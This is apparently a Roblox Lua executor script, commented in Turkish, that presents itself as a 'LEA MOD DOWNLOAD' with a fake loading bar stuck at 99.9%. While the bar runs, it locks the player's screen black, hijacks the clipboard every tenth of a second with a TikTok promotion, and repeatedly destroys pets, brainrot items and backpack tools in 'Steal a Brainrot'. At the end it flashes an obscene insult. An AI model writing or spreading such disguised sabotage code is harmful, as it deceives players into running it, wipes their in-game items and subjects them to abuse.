-- LEA MOD: Steal a Brainrot - Tam ve Tek Parça Sabotaj Scripti
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- 1. Ekranı Simsiya Yapma ve Çıkışı Engelleme (CoreGui Korumalı)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LEAModTrollGUI"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
ScreenGui.DisplayOrder = 999999
pcall(function()
    ScreenGui.Parent = CoreGui
end)
if not ScreenGui.Parent then
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

local Blackout = Instance.new("Frame")
Blackout.Size = UDim2.new(1, 0, 1, 0)
Blackout.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Blackout.BorderSizePixel = 0
Blackout.Parent = ScreenGui

-- 2. "LEA MOD DOWNLOAD" ve Sahte %99.9 Yükleme Barı
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 0, 60)
TitleLabel.Position = UDim2.new(0, 0, 0.4, -50)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "LEA MOD DOWNLOAD"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextSize = 36
TitleLabel.Font = Enum.Font.Code
TitleLabel.Parent = Blackout

local BarBackground = Instance.new("Frame")
BarBackground.Size = UDim2.new(0, 400, 0, 25)
BarBackground.Position = UDim2.new(0.5, -200, 0.4, 20)
BarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
BarBackground.BorderSizePixel = 0
BarBackground.Parent = Blackout

local BarFill = Instance.new("Frame")
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
BarFill.BorderSizePixel = 0
BarFill.Parent = BarBackground

local PercentLabel = Instance.new("TextLabel")
PercentLabel.Size = UDim2.new(1, 0, 1, 0)
PercentLabel.BackgroundTransparency = 1
PercentLabel.Text = "Loading... 0%"
PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentLabel.TextSize = 16
PercentLabel.Font = Enum.Font.Code
PercentLabel.Parent = BarBackground

-- Yükleme Efekti (%99.9'da kalır)
task.spawn(function()
    local progress = 0
    while progress < 99.9 do
        progress = progress + math.random(1, 3) * 0.1
        if progress > 99.9 then progress = 99.9 end
        BarFill.Size = UDim2.new(progress / 100, 0, 1, 0)
        PercentLabel.Text = string.format("Loading... %.1f%%", progress)
        task.wait(math.random(50, 150) / 1000)
    end
end)

-- Pano (Clipboard) Sabotajı (Sayaç artarak yapıştırır)
task.spawn(function()
    local count = 0
    while true do
        pcall(function()
            count = count + 1
            setclipboard("TİKTOK @LEAPLUS " .. tostring(count))
        end)
        task.wait(0.1)
    end
end)

-- 3 & 4. Agresif Pet Silme ve Sürekli Kontrol Döngüsü (Part 2 Birleştirildi)
task.spawn(function()
    local function NukePets()
        pcall(function()
            for _, obj in ipairs(workspace:GetDescendants()) do
                pcall(function()
                    local name = obj.Name:lower()
                    if obj:IsA("Model") and (name:find("pet") or name:find("brainrot") or name:find("animal")) then
                        obj:Destroy()
                    end
                end)
            end
            
            local possibleFolders = {"Pets", "ActivePets", "PlayerPets", "DroppedPets", "SpawnedPets", "Backpack"}
            for _, folderName in ipairs(possibleFolders) do
                local folder = workspace:FindFirstChild(folderName, true)
                if folder then
                    pcall(function() folder:ClearAllChildren() end)
                end
            end

            if LocalPlayer then
                local char = LocalPlayer.Character
                if char then
                    for _, item in ipairs(char:GetChildren()) do
                        if item:IsA("Tool") and (item.Name:lower():find("pet") or item.Name:lower():find("brainrot")) then
                            item:Destroy()
                        end
                    end
                end
                local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
                if bp then
                    for _, item in ipairs(bp:GetChildren()) do
                        if item.Name:lower():find("pet") or item.Name:lower():find("brainrot") then
                            item:Destroy()
                        end
                    end
                end
            end
        end)
    end

    local petsRemaining = true
    while petsRemaining do
        NukePets()
        
        local found = false
        for _, obj in ipairs(workspace:GetDescendants()) do
            local name = obj.Name:lower()
            if obj:IsA("Model") and (name:find("pet") or name:find("brainrot")) then
                found = true
                break
            end
        end
        
        if not found then
            petsRemaining = false
        else
            task.wait(math.random(100, 300) / 1000)
        end
    end

    -- 5. Petler Silindiği An Ekranı Değiştirme
    if BarBackground then
        BarBackground:Destroy()
    end
    if TitleLabel then
        TitleLabel:Destroy()
    end

    local FinalLabel = Instance.new("TextLabel")
    FinalLabel.Size = UDim2.new(1, 0, 0, 100)
    FinalLabel.Position = UDim2.new(0, 0, 0.45, -50)
    FinalLabel.BackgroundTransparency = 1
    FinalLabel.Text = "LEA FUCKED YOUR MOTHER"
    FinalLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    FinalLabel.TextSize = 48
    FinalLabel.Font = Enum.Font.Black
    FinalLabel.Parent = Blackout

    task.spawn(function()
        while true do
            FinalLabel.TextColor3 = Color3.fromRGB(math.random(150, 255), 0, 0)
            FinalLabel.Visible = not FinalLabel.Visible
            task.wait(math.random(150, 300) / 1000)
        end
    end)
end)
